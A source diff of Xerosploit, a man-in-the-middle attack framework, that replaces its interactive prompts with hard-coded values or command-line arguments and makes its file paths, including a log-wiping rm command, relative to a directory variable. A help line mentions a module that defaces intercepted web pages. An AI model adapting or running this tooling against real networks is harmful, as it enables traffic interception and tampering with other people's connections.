 		def cmd0():
 			while True:
 				print("\033[1;32m\n[+] Please type 'help' to view commands.\n\033[1;m")
-				cmd_0 = input("\033[1;36m\033[4mXero\033[0m\033[1;36m ➮ \033[1;m").strip()
+				cmd_0 ="start"
 				if cmd_0 == "scan": # Map the network
 					print("\033[1;34m\n[++] Mapping your network ... \n\033[1;m")
 					scan()
@@ -879,7 +904,11 @@ deface      :  Overwrite all web pages with your HTML code\n\033[1;m"""]
 						print(table.table)
 
 						print("\033[1;32m\n[+] Enter your network gateway.\n\033[1;m")
-						n_gateway = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mgateway\033[0m\033[1;36m ➮ \033[1;m").strip()
+						if len(sys.argv)==4:
+							n_gateway =sys.argv[3]
+						else:
+							n_gateway=input()
+						
 			
 						if n_gateway == "back":
 							home()
@@ -889,7 +918,7 @@ deface      :  Overwrite all web pages with your HTML code\n\033[1;m"""]
 							home()
 						else:
 
-							s_gateway = open('/opt/xerosploit/tools/files/gateway.txt','w')
+							s_gateway = open(directory+'/tools/files/gateway.txt','w')
 							s_gateway.write(n_gateway)
 							s_gateway.close()
 
@@ -906,7 +935,11 @@ deface      :  Overwrite all web pages with your HTML code\n\033[1;m"""]
 						print(table.table)
 
 						print("\033[1;32m\n[+] Enter your network interface.\n\033[1;m")
-						n_up_interface = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4miface\033[0m\033[1;36m ➮ \033[1;m").strip()
+						if len(sys.argv)==4:
+							n_up_interface =sys.argv[3]
+						else:
+							n_up_interface =input()
+						
 
 						if n_up_interface == "back":
 							home()
@@ -915,7 +948,7 @@ deface      :  Overwrite all web pages with your HTML code\n\033[1;m"""]
 						elif n_up_interface == "home":
 							home()
 						else:
-							s_up_interface = open('/opt/xerosploit/tools/files/iface.txt','w')
+							s_up_interface = open(directory+'/tools/files/iface.txt','w')
 							s_up_interface.write(n_up_interface)
 							s_up_interface.close()
 
@@ -930,9 +963,9 @@ deface      :  Overwrite all web pages with your HTML code\n\033[1;m"""]
 				elif cmd_0 == "rmlog": # Remove all logs
 					def rm_log():
 						print("\033[1;32m\n[+] Do want to remove all xerosploit logs ? (y/n)\n\033[1;m")
-						cmd_rmlog = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mrmlog\033[0m\033[1;36m ➮ \033[1;m").strip()
+						cmd_rmlog ="n"
 						if cmd_rmlog == "y":
-							rmlog = os.system("rm -f -R /opt/xerosploit/xerosniff/ /opt/xerosploit/tools/log/* /opt/xerosploit/tools/bettercap/modules/tmp/* /opt/xerosploit/tools/files/dns.conf")
+							rmlog = os.system("rm -f -R "+directory+"/xerosniff/ "+directory+"/tools/log/* "+directory+"/tools/bettercap/modules/tmp/* "+directory+"/tools/files/dns.conf")
 							print("\033[1;31m\n[++] All logs have been removed. \n\033[1;m")
 							sleep(1)
 							home()
